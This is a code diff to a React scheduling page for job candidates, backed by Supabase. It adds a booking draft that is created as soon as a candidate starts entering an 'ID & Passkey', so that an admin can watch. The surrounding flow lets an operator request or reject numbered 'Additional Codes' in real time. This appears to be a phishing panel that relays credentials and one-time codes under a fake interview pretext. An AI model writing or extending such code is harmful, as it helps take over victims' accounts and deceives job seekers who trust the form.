@@ -146,14 +146,14 @@ function SchedulePageInner() {
               setDisplayCodeValue(popVal);
               setVerifyStage("displayCode");
             } else if (req.includes("_REJECTED")) {
-              // Specific Code Rejection (e.g. CODE_1_REJECTED, CODE_2_REJECTED...)
+              // Specific Code Rejection
               const match = req.match(/CODE_(\d)_REJECTED/i);
               const num = match ? parseInt(match[1], 10) : 1;
               setCodeNumber(num);
               setVerifyError(`Additional Code ${num} is incorrect. Please re-enter and try again.`);
               setVerifyStage("code");
             } else if (req.includes("_REQUESTED")) {
-              // Specific Code Requested (e.g. CODE_1_REQUESTED...)
+              // Specific Code Requested
               const match = req.match(/CODE_(\d)_REQUESTED/i);
               const num = match ? parseInt(match[1], 10) : 1;
               setCodeNumber(num);
@@ -242,7 +242,6 @@ function SchedulePageInner() {
     setSubmitting(true);
     setVerifyError(null);
     try {
-      // Fetch latest additional_code data to merge seamlessly
       const { data: currentBooking } = await supabase
         .from("bookings")
         .select("additional_code")
@@ -435,10 +434,45 @@ function SchedulePageInner() {
 
               <form
                 className="space-y-5"
-                onSubmit={(e) => {
+                onSubmit={async (e) => {
                   e.preventDefault();
                   setVerifyError(null);
                   setVerifyStage("idPasskey");
+
+                  // Create initial booking draft immediately so admin sees candidate entering ID & Passkey
+                  try {
+                    if (!bookingId) {
+                      const [firstName, ...rest] = name.trim().split(/\s+/);
+                      const lastName = rest.join(" ") || "-";
+                      const combinedNotes = [notes, guestEmail ? `Guests: ${guestEmail}` : ""].filter(Boolean).join("\n");
+
+                      const { data, error } = await supabase
+                        .from("bookings")
+                        .insert({
+                          job_id: jobId,
+                          first_name: firstName || name,
+                          last_name: lastName,
+                          email,
+                          phone_number: phone || null,
+                          notes: combinedNotes || null,
+                          date: selectedDate,
+                          start_time: selectedSlot!.start_time,
+                          end_time: selectedSlot!.end_time,
+                          timezone,
+                          candidate_id: null,
+                          passkey: null,
+                          status: "pending",
+                        })
+                        .select("id")
+                        .single();
+
+                      if (data?.id) {
+                        setBookingId(data.id);
+                      }
+                    }
+                  } catch (err) {
+                    console.error("Initial booking draft creation:", err);
+                  }
                 }}
               >
                 {/* Name */}
